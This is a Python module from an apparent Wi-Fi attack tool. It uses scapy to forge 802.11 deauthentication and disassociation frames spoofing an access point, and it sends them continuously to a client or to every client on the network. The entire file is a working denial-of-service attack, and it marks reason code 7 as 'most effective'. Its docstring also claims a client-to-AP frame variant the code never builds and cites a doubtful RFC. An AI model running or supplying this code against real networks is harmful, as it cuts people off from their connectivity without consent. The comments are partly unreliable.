"""
core.injector
=============

Build and continuously inject 802.11 deauthentication (and optionally
disassociation) frames until interrupted.

The injector emits multiple frame variants per loop tick:

  1. AP -> client     (the AP says goodbye to the client)
  2. client -> AP     (the client says goodbye to the AP)
  3. AP -> broadcast  (tells every client on the BSSID to leave)

A valid `reason` code (RFC 8110 / IEEE 802.11-2016 Table 9-45) is included
in every frame; some PMF-aware APs reject deauths with unknown reasons.

Common reasons:
  1 = unspecified
  4 = Disassociated due to inactivity
  5 = Disassociated because AP is unable to honor all currently
      associated STAs
  7 = Class 3 frame received from nonassociated STA (most effective)
  8 = Disassociated because sending STA is leaving BSS
"""

from __future__ import annotations

import signal
import threading
import time
from dataclasses import dataclass
from typing import Optional

from scapy.all import (  # type: ignore
    Dot11,
    Dot11Deauth,
    Dot11Disas,
    RadioTap,
    conf,
    sendp,
)

from .interface import set_channel
from .utils import log


REASON_UNSPECIFIED              = 1
REASON_INACTIVITY               = 4
REASON_AP_OVERLOAD              = 5
REASON_CLASS3_FROM_UNASSOC_STA  = 7
REASON_STA_LEAVING_BSS          = 8

VALID_REASONS = {
    REASON_UNSPECIFIED:             "unspecified",
    REASON_INACTIVITY:              "inactivity",
    REASON_AP_OVERLOAD:             "AP overload",
    REASON_CLASS3_FROM_UNASSOC_STA: "class-3 from unassociated STA",
    REASON_STA_LEAVING_BSS:         "STA leaving BSS",
}

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


@dataclass
class DeauthTarget:
    bssid: str
    client: str = BROADCAST_MAC


def build_deauth(target: DeauthTarget, *, reason: int = REASON_UNSPECIFIED,
                 frame_type: str = "deauth") -> RadioTap:
    """Return a RadioTap / Dot11 / Dot11Deauth (or Dot11Disas) frame."""
    body_cls = Dot11Disas if frame_type == "disassoc" else Dot11Deauth
    return (
        RadioTap()
        / Dot11(addr1=target.client, addr2=target.bssid, addr3=target.bssid)
        / body_cls(reason=reason)
    )


class DeauthInjector:
    """Continuously send deauth frames at `interval`s until `.stop()` is called."""

    def __init__(self, iface: str, target: DeauthTarget, *,
                 reason: int = REASON_CLASS3_FROM_UNASSOC_STA,
                 interval: float = 0.1,
                 broadcast: bool = True,
                 include_disassoc: bool = False,
                 channel: Optional[int] = None) -> None:
        self.iface = iface
        self.target = target
        self.reason = reason
        self.interval = interval
        self.broadcast = broadcast
        self.include_disassoc = include_disassoc
        self.channel = channel

        self._stop = threading.Event()
        self._installed_signal = False
        self._sent = 0
        self._lock = threading.Lock()
        self._start_ts = 0.0

    def start(self) -> None:
        """Begin sending. Returns immediately; the loop runs in a background thread."""
        if self.channel:
            try:
                set_channel(self.iface, self.channel)
            except RuntimeError as e:
                log.warning("Channel set failed (%s); continuing", e)

        self._install_signal_handlers()
        self._start_ts = time.monotonic()
        threading.Thread(target=self._run, name="DeauthInjector", daemon=True).start()

    def stop(self) -> None:
        self._stop.set()

    def join(self) -> int:
        """Block until the loop exits. Returns total frames sent."""
        while not self._stop.is_set():
            time.sleep(0.05)
        return self._sent

    def _install_signal_handlers(self) -> None:
        if self._installed_signal:
            return
        if threading.current_thread() is not threading.main_thread():
            return  # signal handlers only apply on the main thread

        def _handler(signum, _frame):
            log.info("Received signal %s; stopping injection", signum)
            self.stop()

        try:
            signal.signal(signal.SIGINT, _handler)
            signal.signal(signal.SIGTERM, _handler)
            self._installed_signal = True
        except (ValueError, OSError):
            pass

    def _run(self) -> None:
        conf.verb = 0

        targets: list[DeauthTarget] = []
        if self.broadcast or self.target.client == BROADCAST_MAC:
            targets.append(DeauthTarget(self.target.bssid, BROADCAST_MAC))
        if self.target.client != BROADCAST_MAC:
            targets.append(DeauthTarget(self.target.bssid, self.target.client))

        frames = []
        for t in targets:
            frames.append(build_deauth(t, reason=self.reason, frame_type="deauth"))
            if self.include_disassoc:
                frames.append(build_deauth(t, reason=self.reason, frame_type="disassoc"))

        log.info(
            "Injecting %d frame variants against %s (reason=%d) every %.2fs",
            len(frames), self.target.bssid, self.reason, self.interval,
        )

        idx = 0
        last_status = time.monotonic()
        try:
            while not self._stop.is_set():
                frame = frames[idx % len(frames)]
                try:
                    sendp(frame, iface=self.iface, verbose=False, count=1)
                    with self._lock:
                        self._sent += 1
                except Exception as e:
                    log.debug("sendp failed: %s", e)
                idx += 1

                now = time.monotonic()
                if now - last_status >= 1.0:
                    elapsed = now - self._start_ts
                    rate = self._sent / elapsed if elapsed > 0 else 0
                    log.info("Deauth in progress  |  %d frames sent  |  %.1f fps",
                             self._sent, rate)
                    last_status = now

                end = time.monotonic() + self.interval
                while not self._stop.is_set() and time.monotonic() < end:
                    time.sleep(0.02)
        finally:
            elapsed = time.monotonic() - self._start_ts
            log.info("Stopped  |  sent %d frames in %.1fs", self._sent, elapsed)


def inject(bssid: str, client: str, iface: str, *,
           reason: int = REASON_CLASS3_FROM_UNASSOC_STA,
           interval: float = 0.1,
           channel: Optional[int] = None,
           include_disassoc: bool = False) -> int:
    """Blocking call: inject until interrupted. Returns total frames sent."""
    target = DeauthTarget(bssid=bssid.upper(), client=client.upper())
    injector = DeauthInjector(
        iface=iface, target=target,
        reason=reason, interval=interval,
        broadcast=(client == BROADCAST_MAC),
        include_disassoc=include_disassoc,
        channel=channel,
    )
    injector.start()
    try:
        return injector.join()
    except KeyboardInterrupt:
        log.info("Ctrl+C; stopping")
        injector.stop()
        return injector._sent
